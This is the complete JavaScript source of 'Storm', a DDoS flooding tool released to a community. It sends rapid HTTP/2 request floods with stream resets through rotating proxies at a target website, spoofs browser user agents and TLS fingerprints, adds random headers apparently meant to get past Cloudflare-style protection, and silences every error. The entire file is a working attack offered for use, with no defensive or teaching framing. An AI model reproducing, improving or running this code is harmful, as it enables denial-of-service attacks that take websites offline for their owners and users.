
/*
    Storm (js v1.1)

    Thank you for 900 members!

    Released by Serena Lotus

    Made by Crisxtop
*/

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const pLimit = require('p-limit');
const v8 = require('v8');
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");


function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
  
const options = [
    { flag: '--ratelimit', value: get_option('--ratelimit') },
    { flag: '--cookie', value: get_option('--cookie') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }
    
    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
    const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt --ratelimit true/false --cookie true/false `).rainbow; process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
     `Host: ${options.address}:443\r\n` +
     `Proxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP FOUND ', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 10;


if (cluster.isMaster) {
    console.clear();
    console.log('HEAP SIZE:',v8.getHeapStatistics().heap_size_limit/(1024*1024))
    console.log(`@needmoreloli`.bgRed), console.log(`[!] CRISXTOP`);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(function() {
        runFlooder()
      }, 1);
    
  
    
  }
  function runFlooder() {
const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-sec-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }
  const getRandomChar = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * chars.length);
    return chars[randomIndex];
};
    const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const fullVersions = {
        brave: "90.0.4430.212",
        chrome: "90.0.4430.212",
        firefox: "88.0",
        safari: "14.1",
        mobile: "90.0.4430.212",
        opera: "90.0.4430.212",
        operagx: "90.0.4430.212"
    };

    
    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    

cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
const versions = {
    chrome: { min: 115, max: 124 },
    safari: { min: 12, max: 16 },
    brave: { min: 115, max: 124 },
    firefox: { min: 99, max: 112 },
    mobile: { min: 85, max: 105 },
    opera: { min: 70, max: 90 },
    operagx: { min: 70, max: 90 }
};

const platforms = [
    // Windows
    "Windows:Windows NT 11.0; Win64; x64", // Windows 11
    "Windows:Windows NT 10.0; Win64; x64", // Windows 10
    "Windows:Windows NT 6.2; Win64; x64", // Windows 8.1
    "Windows:Windows NT 6.1; Win64; x64", // Windows 7
    "Windows:Windows NT 10.0; ARM64", // Windows on ARM

    // Linux
    "Linux:X11; Ubuntu; Linux x86_64", // Ubuntu Linux
    "Linux:X11; Fedora; Linux x86_64", // Fedora Linux
    "Linux:X11; Arch Linux x86_64", // Arch Linux
    "Linux:X11; CentOS; Linux x86_64", // CentOS Linux
    "Linux:X11; Debian; Linux x86_64", // Debian Linux

    // macOS
    "macOS:Macintosh; Intel Mac OS X 13_0", // macOS Sonoma
    "macOS:Macintosh; Intel Mac OS X 12_0", // macOS Monterey
    "macOS:Macintosh; Intel Mac OS X 11_0", // macOS Big Sur
    "macOS:Macintosh; M1 Mac OS X 12_0", // macOS Monterey on M1

    // Android
    "Android:Linux; Android 14; Pixel 8 Pro Build/UPH3.220920.003", // Pixel 8 Pro
    "Android:Linux; Android 13; Samsung Galaxy S23 Build/TP1A.220624.014", // Samsung Galaxy S23
    "Android:Linux; Android 12; OnePlus 9 Build/OPM1.210911.020", // OnePlus 9

    // iOS
    "iOS:iPhone; CPU iPhone OS 17_0 like Mac OS X", // iPhone 15
    "iOS:iPad; CPU OS 17_0 like Mac OS X", // iPad Pro (10th Gen)
    "iOS:iPhone; CPU iPhone OS 16_0 like Mac OS X", // iPhone 14
    "iOS:iPad; CPU OS 16_0 like Mac OS X" // iPad Air (5th Gen)
];


const getPlatform = (browser) => {
    const platformMap = {
        chrome: "Windows",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux"
    };

    const platformKey = platformMap[browser];
    if (!platformKey) {
        console.error(`No platform mapping found for browser: ${browser}`);
        return null;
    }

    const matchingPlatforms = platforms.filter(platform => platform.startsWith(platformKey));
    if (matchingPlatforms.length === 0) {
        console.error(`No user agents found for platform: ${platformKey}`);
        return null;
    }

    const randomIndex = Math.floor(Math.random() * matchingPlatforms.length);
    return matchingPlatforms[randomIndex].split(":")[1];
};

const getVersion = (browser) => {
    const versionRange = versions[browser];
    if (!versionRange) {
        console.error(`No version range found for browser: ${browser}`);
        return null;
    }
    return Math.floor(Math.random() * (versionRange.max - versionRange.min + 1)) + versionRange.min;
};

const getRandomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const userAgents = {
    chrome: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion(browser)}.0.0.0 Safari/537.36`,
    safari: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${getVersion(browser)} Safari/537.36`,
    brave: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Brave/${getVersion(browser)}.0.0.0 Safari/537.36`,
    firefox: `Mozilla/5.0 (${getPlatform(browser)}) Gecko/20100101 Firefox/${getVersion(browser)}`,
    mobile: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion(browser)} Mobile Safari/537.36`,
    opera: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Opera/${getVersion(browser)}`,
    operagx: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Opera GX/${getVersion(browser)}`
};
const getSecChUaHeader = (browser) => {
    const version = getVersion(browser);
    if (!version) return null;

    const fullVersion = `v="${version}.0"`;
    switch (browser) {
        case 'chrome':
        case 'brave':
        case 'opera':
        case 'operagx':
            return `"${browser.replace(/^./, str => str.toUpperCase())}";${fullVersion}, "Chromium";${fullVersion}`;
        case 'firefox':
            return `"Firefox";${fullVersion}`;
        case 'safari':
            return `"Safari";${fullVersion}`;
        case 'mobile':
            return `"Google Chrome";${fullVersion}`;
        default:
            return `"${browser.replace(/^./, str => str.toUpperCase())}";${fullVersion}`;
    }
};

const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.brave,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.brave,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        chrome: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.chrome,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.chrome,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        firefox: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.firefox,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.firefox,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        safari: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.safari,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.safari,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        mobile: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
           ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.mobile,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.mobile,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        opera: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
           ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.opera,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.opera,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        },
        operagx: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "sec-ch-ua": getSecChUaHeader.operagx,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
             "Sec-Fetch-Site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            "Pragma": "no-cache",
            "user-agent": userAgents.operagx,
            "accept-encoding": `${acceptEncoding}`,
           "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        }
    };

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
      

const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        maxRedirects: 20,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        followAllRedirects: true,
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, async () => {
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);

});
async function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();

    if (!cipherInfo) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}
tlsSocket.on('secureConnect', async () => {
    const ja3Fingerprint = await generateJA3Fingerprint(tlsSocket);
    headers["ja3"] = ja3Fingerprint;
});

tlsSocket.on('error', (error) => {
});


    let clasq = {
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
        enablePush: true,
        enableConnectProtocol: false,
        ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
        ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
        ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
        ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
    };
function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
}
setInterval(function() {
        incrementClasqValues()
      }, 10000);

    let hpack = new HPACK();
    hpack.setTableSize(4096);
    let client;
    
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        "unknownProtocolTimeout": 10,
        "maxReservedRemoteStreams": 4000,
        "maxSessionMemory": 200,
        settings : clasq,
        socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(8);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535;
        client.setLocalWindowSize(localWindowSize + 10, 0);
    });
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });
});

    clients.forEach(client => {
    const intervalId = setInterval(() => {
        async function sendRequests()  {
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
            
            
            
            
            const limit = pLimit(10);

const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');





                         
            let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                
                const head = {
                    ...dynHeaders,
                    ...headers,
                };

            

            
            let count = 0;
            let ratelimit = [];
            const filterRateLimit = (ratelimit) => {
            const currentTime = Date.now();
            return ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
};
            
                            const increaseRequestRate = async (client, head, args) => {
                                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
                                ratelimit = filterRateLimit(ratelimit);
                                
                                    const requests = [];
                            
                                    for (let i = 0; i < args.Rate; i++) {
                                    
                                    const priorityWeight = Math.floor(Math.random() * 256); 
                                        const requestPromise = limit(() => new Promise((resolve, reject) => {
                                            const req = client.request(head, {
                                                weight: priorityWeight,
                                                parent:0,
                                                exclusive: true,
						                        endStream: true,
                                                dependsOn: 0,
                                               
                                            });
                                            req.setEncoding('utf8');
                                            req.on('response', (res) => {
                                            req.close(http2.constants.NO_ERROR);
                                            req.destroy();
                                            if (enabled('cookie')) {
                                                const cookies = res.headers['set-cookie']; 
                                                if (Array.isArray(cookies) && cookies.length > 32) {
                                                    headers['cookie'] = cookies.join('; ');
                                                    console.log('Cookies:', cookies);
                                                }
                                            }
                            
                                            resolve();
                                            });
                            
                                            req.on('end', () => {
                                                count++;
                                                if (count === args.time * args.Rate) {
                                                    clearInterval(intervalId);
                                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                                    client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                                                } else if (count === args.Rate) {
                                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                                    client.destroy();
                                                    clearInterval(intervalId);
                                                }
                                                reject(new Error('Request timed out'));
                                            });
                            
                                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                                            
                                        }));
                            
                                        const packed = Buffer.concat([
                                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                            hpack.encode(head)
                                        ]);
                            
                                         let streamId = 1;
                                         let streamIdReset = 0;
                                         const flags = 0x1 | 0x4 | 0x8 | 0x20;
                                         const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                                        const frame = Buffer.concat([encodedFrame]);
                            
                                        if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([
                                                encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                                frame
                                                
                                                
                                            ]));
                                        } else if (streamIdReset >= 2 && (streamIdReset -2) % 4 === 0) {
                                        tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)
                            
                                        ]));
                            } 
                                        streamIdReset+= 2;
                                        streamId += 2;


                                        const status = res[':status'];
                                        if (status === 429 && enabled('ratelimit')) {
                                        ratelimit.push({timestamp: Date.now(), request: requestPromise });
                                        client.destroy();
                                         return;
                                         }


                                        requests.push({ requestPromise, frame });
                                    
                            
                                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                                }
                            }
                            await increaseRequestRate(client, head, args);
                        }
                           
                            sendRequests();
                    },500);
                });
    
          client.on('streamClosed', (streamId) => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
        });
    }
const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

